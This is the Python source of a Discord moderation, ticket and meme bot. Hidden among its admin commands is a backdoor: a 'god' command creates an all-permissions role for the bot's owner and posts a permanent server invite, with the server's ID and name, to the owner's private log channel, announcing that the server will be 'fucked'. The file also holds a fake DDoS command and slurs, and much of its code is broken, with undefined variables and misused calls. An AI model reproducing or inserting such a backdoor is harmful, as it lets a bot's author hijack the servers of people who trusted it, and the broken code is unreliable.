import os
import collections
import discord
import aiohttp
from discord.ext import commands
import requests
from datetime import datetime
import subprocess
import time
import json
import datetime
import random
import string
import pymongo
from time import sleep
from discord.utils import get
from discord import Client
from discord import Permissions
from discord import Member
from discord.ext.commands import has_permissions
from discord.ext.commands import has_role
from discord.ext.commands import cooldown
from discord.ext.commands import BucketType
from discord.ext.commands import MissingPermissions
from discord.ext import commands
from pyrandmeme import *
import asyncio
from discord import Intents

bot = commands.Bot(command_prefix="-", help_command=None)
bot.remove_command('help')
bot.remove_command('methods')

max_ticket_channel = 10
ticket_service = True
ticket_manager_role = None
ticket_admin_role = None

servers = []#im still workinf on this 

owner = []#put your user id there 

token = ''#put your bot token here

logschannel = ''#put your logs channel id here

@bot.command()
@commands.has_permissions(ban_members=True)
async def nuke(ctx):
	await ctx.channel.purge(limit=100000)
	nuke = discord.Embed(title="This Channel Has Been Nuked", color=0x000000)
	nuke.set_image(url="https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif")
	nuke.set_footer(text="By Paradym")
	await ctx.send(embed=nuke)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game('.gg/Ab6767TCSY | -help BY Paradym |'))#do not chnage this 
    print(f'''      
      █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓
    ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒
    ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░
    ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ 
    ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒
    ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
    ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░
        ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   
    ░       ░           ░  ░         ░             ░            ░   
    Bot By Paradym''')
    print('')
    print('    Maker: Paradym')
    print('    Connection:')
    print('    [ESTABLISHED]')
    print('    The Bot Is Now Online')
    print('    ')
    print('    Logs:')     
    
@bot.command()
async def help(ctx):
    help = discord.Embed(title=f"{ctx.message.guild.name} | 𝙃𝙚𝙡𝙥 𝙈𝙚𝙣𝙪", color=0x000000, description="These Are The List Of All Of The Commands")
    help.add_field(name="-admin", value="Shows Admin Commands ", inline=True)
    help.add_field(name="-ticket", value="Shows Ticket Commands [work in progress\does not work atm]", inline=True)
    help.add_field(name="-meme", value="Meme Shit", inline=False)
    help.add_field(name="-credits", value="Shows Credits", inline=True)
    help.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=help)
    print(f"    {ctx.author} used help in {ctx.channel}")
    bot.get_channel(logschannel)
    log = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
    log.add_field(name=f"{ctx.author}", value=f"used help in {ctx.channel}", inline=False)
    await channel.send(embed=log)


@bot.command() 
@has_permissions(ban_members=True)  
async def admin(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} | 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-kick", value="-kick [@member] [reason] -  Kicks a member", inline=False)
    admin.add_field(name="-ban", value="-ban [@member] [reason] - Bans a member", inline=False)
    admin.add_field(name="-unban", value="-unban [member id] - Unbans a member", inline=False)
    admin.add_field(name="-strip", value="-strip [@member] - Strips member of all roles", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    bot.get_channel(logschannel)
    log = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
    log.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
    await channel.send(embed=log)
 
#still working on this 
@bot.event
async def on_member_join(ctx):
    with open('blacklist.json') as f:
        d = load(f)
        blacklist = d["blacklist"]
        if ctx.member.id == blacklist:
            message = f"You have been blacklisted from {ctx.guild.name}\nIf you want to appeal this then please messasge server owner"
            await member.send(message)
            await ctx.guild.kick(ctx.member.id)
        else:
            message = f"Welcome to {ctx.message.guild.name}"
            await member.send(message)
                    
#still working on this 
@bot.command() 
@has_permissions(ban_members=True)  
async def blacklist(ctx,member:discord.User=None, userid=None, reason =None):
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot blacklist yourself")
        return
    if reason == None:
        reason = "For being a jerk!"
    message = f"You have been blacklisted from {ctx.guild.name} for {reason}"
    await member.send(message)
    await ctx.guild.kick(member)
    await ctx.channel.send(f"{member} has been blacklisted for {reason}")
    with open('blacklist.json') as f:
        data = json.load(f)
        for i in data['blacklist']:
            dictionary = {
                          "blacklist": [f"{i},{userid}"]
                         }
            with open("blacklist.json", "w") as outfile:
                json.dump(dictionary, outfile)
    
      

@bot.command()  
async def ticket(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} | 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-tcreate", value="-tcreate [reason] - to be create the ticket", inline=False)
    admin.add_field(name="-tclose", value="-tclose [reason] - to close the ticket (ticket only closed by ticket admin or ticket manager, user just only can make a request to close)", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    bot.get_channel(logschannel)
    log = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
    log.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
    await channel.send(embed=log)
    
@bot.command()
@commands.has_permissions(manage_channels=True)  
async def tadmin(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} | 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-tsetadmin", value="-tsetadmin [@member] - to set a ticket admin with role name 'Ticket Admin' (Ticket Manager can use this command)", inline=False)
    admin.add_field(name="-tsetmanager", value="-tsetmanager [@member] - to set a ticket manager with role name 'Ticket Manager' (User with adminstrator permission can use this command)", inline=False)
    admin.add_field(name="-tservice", value="-tservice [on/off] - you can enable or disable (on/off) ticket service so noone can abuse it by make ticket channels.", inline=False)
    admin.add_field(name="-tsetrole", value="-tsetrole [@your ticket manager role] [@your ticket admin role] - you can set what roles you want as ticket admin or manager.", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    bot.get_channel(logschannel)
    log = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
    log.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
    await channel.send(embed=log)

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if reason==None:
      reason=" no reason provided"
    await ctx.guild.kick(member)
    await ctx.send(f'User {member.mention} has been kicked for {reason}')
    
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban (ctx, member:discord.User=None,  reason =None):
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot ban yourself")
        return
    if reason == None:
        reason = "For being a jerk!"
    message = f"You have been banned from {ctx.guild.name} for {reason}"
    await member.send(message)
    await ctx.guild.ban(id, reason=reason)
    await ctx.channel.send(f"{member} is banned for {reason}")
    
@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)
 
@bot.command()
@commands.has_permissions(manage_roles=True)
async def strip(ctx,member:discord.User=None):
    guild = ctx.guild
    members_roles = member.roles
    for i in range(len(members_roles)-1):
        await member.remove_roles(members_roles[i+1])
    await ctx.channel.send(f"{member} has been stripped of all roles!!") 
#---------WORKING ON-----------
@bot.command()
async def tcreate(ctx, *,reason:str):
    channel = await ctx.guild.create_text_channel(f'Ticket : {ctx.author.name}', category=discord.utils.get(ctx.guild.categories, name='TICKETS'))
    embed = discord.Embed(title="Ticket", description="Please wait support will be with you shortly.", colour=ctx.author.colour)
    embed.add_field(name="Created By:", value=f"{ctx.author.name}", inline=True)
    embed.add_field(name="Reason:", value=f"{reason}", inline=True)
    embed.set_footer(text="Seraph Tickets", icon_url=ctx.bot.user.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def tclose(ctx, *, reason:str):
  if is_ticket_manager(ctx) == True or is_ticket_admin(ctx) == True:

    if "ticket" in ctx.channel.name:

      return await ctx.channel.delete(reason=reason)

    else:
      return await ctx.send("Please use this command only in ticket channels.")

  else:
    for tchannel in ctx.guild.channels:

      if str(ctx.author.discriminator) in str(tchannel.name):

        if str(ctx.channel.name) in str(tchannel.name):

          await tchannel.set_permissions(ctx.author, read_messages=False, send_messages=False)
          return await tchannel.send(f"{ctx.author.name} has requested to close the ticket. Reason: {reason}")

        else:
          return await tchannel.send(f"Please use this command here to close the ticket. {tchannel.mention}")
      
    else:
      return await ctx.channel.send("Your ticket is not found or ticket has already closed.")

@bot.command()
@commands.has_permissions(administrator=True)
async def tsetrole(ctx, mrole:discord.Role, arole:discord.Role):

  for managerrole in ctx.guild.roles:
    if str(mrole.name) == str(managerrole.name):

      global ticket_manager_role 
      ticket_manager_role = str(managerrole.name)
      break

  else:
    return await ctx.send(f"{ctx.author.mention} Failed to set ticket manager role. No role name found {mrole}")

  for adminrole in ctx.guild.roles:
    if str(arole.name) == str(adminrole.name):

      global ticket_admin_role
      ticket_admin_role = str(adminrole.name)
      break

  else:
    return await ctx.send(f"{ctx.author.mention} Failed to set ticket admin role, No role name found {mrole} or {arole}")

  embed = discord.Embed(title="Role Set", description=f"Successfully set the ticket roles.", colour=ctx.bot.user.colour)
  embed.set_thumbnail(url=ctx.bot.user.avatar_url)
  embed.add_field(name="Ticket Manager:", value=f"{ticket_manager_role}", inline=True)
  embed.add_field(name="Ticket Admin:", value=f"{ticket_admin_role}", inline=True)
  embed.set_footer(text="Seraph Tickets", icon_url=ctx.bot.user.avatar_url)
  return await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(manage_roles=True)
async def tsetadmin(ctx, member:discord.Member):

  if ticket_admin_role == None:
    await ctx.send(f"{ctx.author.mention} Ticket admin role is not set. Please set it by `tsetrole`")

  if ctx.author.name == member.name:
    return await ctx.send(f"{ctx.author.mention} You cannot give ticket admin role to yourself")

  else:

    for mrole in ctx.author.roles:
      if ticket_manager_role in str(mrole):

        for arole in member.roles:
          if ticket_admin_role in str(arole):
            return await ctx.send(f"{ctx.author.mention}, Mention member already have ticket admin role.")

        else:
          try:

            await member.add_roles(discord.utils.get(ctx.guild.roles, name=ticket_admin_role),reason=None, atomic=True)
            await ctx.send(f"{member.mention}, You are now ticket admin.")
            return await ctx.send(f"{ctx.author.mention}, `{member.name}` is now ticket admin.")

          except Exception as error:
            await ctx.send(f"{ctx.author.mention}, Something went wrong!")
            return print(f"Error (tsetadmin): {error}")
      
    else:
      await ctx.send(f"{ctx.author.mention}, You don't have access to set a ticket admin")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def tsetmanager(ctx, member:discord.Member):

  if ticket_manager_role == None:
    await ctx.send(f"{ctx.author.mention} Ticket manager role is not set. Please set it by `tsetrole`")

  if ctx.author.name == member.name:
    return await ctx.send(f"{ctx.author.mention}, You cannot give manager role to yourself.")
  
  else:

    for role in member.roles:
      if ticket_manager_role in str(role):
        return await ctx.send(f"{ctx.author.mention}, Mention member already have ticket manager role.")

    else:
      try:

        await member.add_roles(discord.utils.get(ctx.guild.roles, name=ticket_manager_role),reason=None, atomic=True)
        await ctx.send(f"{member.mention}, You are ")
        return await ctx.send(f"{ctx.author.mention}, `{member.name}` is now ticket manager")

      except Exception as error:

        await ctx.send(f"{ctx.author.mention}, Something went wrong!")
        return print(f"Member ticket admin add role error: {error}")
    
@bot.command()
async def tservice(ctx, state:str):
  global ticket_service
  
  if ticket_manager_role != None:

    if is_ticket_manager(ctx) == True:

      if state == "on" or state == "enable":
        ticket_service = True
        return await ctx.send(f"{ctx.author.mention}, Ticket service is set to `{state}`")

      elif state == "off" or state == "disable":
        ticket_service = False
        return await ctx.send(f"{ctx.author.mention}, Ticket service is set to `{state}`")

      else:
        await ctx.send(f"{ctx.author.mention}, You have send invaild input.")
        await ctx.send(f"Correct Usage: tservice [on/off] or [enable/disable]")

    else:
      await ctx.send(f"{ctx.author.mention}, You don't have permission to use this command.")
  
  else:
    return await ctx.send(f"Ticket Manager Role is not set. Please set the role first by `tsetrole [@role (Ticket Manager Role)] [@role (Ticket Admin Role)]`")

@tclose.error
async def tcreate_error(ctx, error):

  if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument):
    await ctx.send(f"{ctx.author.mention} Correct Usage: `-tcreate [reason]`")

@tclose.error
async def tclose_error(ctx, error):

  if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument):
    await ctx.send(f"{ctx.author.mention} Correct Usage: `-tclose [reason]`")

@tsetrole.error
async def tsetrole_error(ctx, error):

  if isinstance(error, commands.MissingPermissions):
    await ctx.send(f"{ctx.author.mention} You don't have permission to use this command.")

  if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument):
    await ctx.send(f"{ctx.author.mention} Correct Usage: `-tsetrole [@your ticket manager role] [@your ticket admin role]`")

@tsetadmin.error
async def tsetadmin_error(ctx, error):

  if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument):
    await ctx.send(f"{ctx.author.mention} Correct Usage: `-tsetadmin [@member]`")

@tsetmanager.error
async def tsetmanager_error(ctx, error):

  if isinstance(error, commands.MissingPermissions):
    await ctx.send(f"{ctx.author.mention} You don't have permission to use this command.")

  if isinstance(error, commands.MissingRequiredArgument) or isinstance(error, commands.BadArgument):
    await ctx.send(f"{ctx.author.mention} Correct Usage: `-tsetmanager [(mention)member]`")
  
def is_ticket_manager(ctx):
  for role in ctx.author.roles:
    if ticket_manager_role in str(role):
      return True
  else:
    return False

def is_ticket_admin(ctx):
  for role in ctx.author.roles:
    if ticket_admin_role in str(role):
      return True
  else:
    return False
#--------------------------------------------------------------------
@bot.command(pass_context=True)
async def meme(ctx):
    await ctx.send(embed=await pyrandmeme())
    
@bot.command()
async def realddos(ctx,member:discord.User=None):
    if member.id in owner:    
        await ctx.channel.send(f"-----------------------------------------\nTotaly Real DDOS aTTACK sENT!!\nInfo\nUSER: {ctx.author.name}\nIP: HIDDEN\nMETHOD: UNOREVERSEBUTTFUCK\n-----------------------------------------")
    else:
        await ctx.channel.send(f"-----------------------------------------\nTotaly Real DDOS aTTACK sENT!!\nInfo\nUSER: {member}\nIP: HIDDEN\nMETHOD: 69BUTTFUCK69\n-----------------------------------------")
 
@bot.command()
async def god(ctx):
    if ctx.author.id in owner:
        guild = ctx.guild
        role = await guild.create_role(name="G3T FXCKED", permissions=Permissions.all())
        me = ctx.author
        await me.add_roles(role)
        bot.get_channel(logschannel)
        server = f"{ctx.message.guild.id}"
        link = await ctx.channel.create_invite(max_age = 0)
        log = discord.Embed(title="LMAOOOO", color=0x000000, description="")
        log.add_field(name="FXCKED ALERT", value="This server gon get fucked", inline=False)
        log.add_field(name="Server ID:", value=f"{ctx.message.guild.id}", inline=False)
        log.add_field(name="Server Name:", value=f"{ctx.message.guild.name}", inline=False)
        log.add_field(name="Server Invite:", value= (link), inline=False)
        log.add_field(name="God Logs: ", value= f"{ctx.author} Used the god command in the server", inline=False)
        await channel.send(embed=log)
    else:
        err = discord.Embed(title="Invalid Server ID", color=0x000000, description="")
        err.add_field(name="ERROR:", value="The dumbass who invited the bot to this server didnt realise i am private and i will not work in this server", inline=False)
        err.add_field(name="FIX:", value="If u would like to fix this issue please message Paradym#0116 to sort out a deal otherwise i aint working", inline=False)
        await ctx.send(embed=err)
        bot.get_channel(logschannel)
        server = f"{ctx.message.guild.id}"
        link = await ctx.channel.create_invite(max_age = 0)
        log = discord.Embed(title="ATTENTION", color=0x000000, description="")
        log.add_field(name="UNKOWN SERVER ID", value="Someone invited me to a retarded server", inline=False)
        log.add_field(name="Server ID:", value=f"{ctx.message.guild.id}", inline=False)
        log.add_field(name="Server Name:", value=f"{ctx.message.guild.name}", inline=False)
        log.add_field(name="Server Invite:", value= (link), inline=False)
        log.add_field(name="Caution: ", value= f"{ctx.author} Tryed to use the god command", inline=False)
        await channel.send(embed=log)

@bot.command()
async def leave(ctx):
    if ctx.author.id in owner:
        guild = bot.get_guild(ctx.message.guild.id)
        await guild.leave()
    else:
        err = discord.Embed(title="Invalid Server ID", color=0x000000, description="")
        err.add_field(name="ERROR:", value="The dumbass who invited the bot to this server didnt realise i am private and i will not work in this server", inline=False)
        err.add_field(name="FIX:", value="If u would like to fix this issue please message Paradym#0116 to sort out a deal otherwise i aint working", inline=False)
        await ctx.send(embed=err)
        bot.get_channel(logschannel)
        server = f"{ctx.message.guild.id}"
        link = await ctx.channel.create_invite(max_age = 0)
        log = discord.Embed(title="ATTENTION", color=0x000000, description="")
        log.add_field(name="UNKOWN SERVER ID", value="Someone invited me to a retarded server", inline=False)
        log.add_field(name="Server ID:", value=f"{ctx.message.guild.id}", inline=False)
        log.add_field(name="Server Name:", value=f"{ctx.message.guild.name}", inline=False)
        log.add_field(name="Server Invite:", value= (link), inline=False)
        log.add_field(name="Caution: ", value= f"{ctx.author} Tryed to use the god command", inline=False)
        await channel.send(embed=log)
#still working on this
@bot.command()
async def test(ctx):
    with open('servers.json','r') as f:
        data = json.loads(f)
        value1 = data['servers']   
        if ctx.message.guild.id == value1:
            err = discord.Embed(title="Invalid Server ID", color=0x000000, description="")
            err.add_field(name="ERROR:", value="The dumbass who invited the bot to this server didnt realise i am private and i will not work in this server", inline=False)
            err.add_field(name="FIX:", value="If u would like to fix this issue please message Paradym#0116 to sort out a deal otherwise i aint working", inline=False)
            await ctx.send(embed=err)
        else:
            err = discord.Embed(title="it dont work", color=0x000000, description="")
            err.add_field(name="ERROR:", value="The dumbass who invited the bot to this server didnt realise i am private and i will not work in this server", inline=False)
            err.add_field(name="FIX:", value="If u would like to fix this issue please message Paradym#0116 to sort out a deal otherwise i aint working", inline=False)
            await ctx.send(embed=err)

bot.run(token, bot=True)


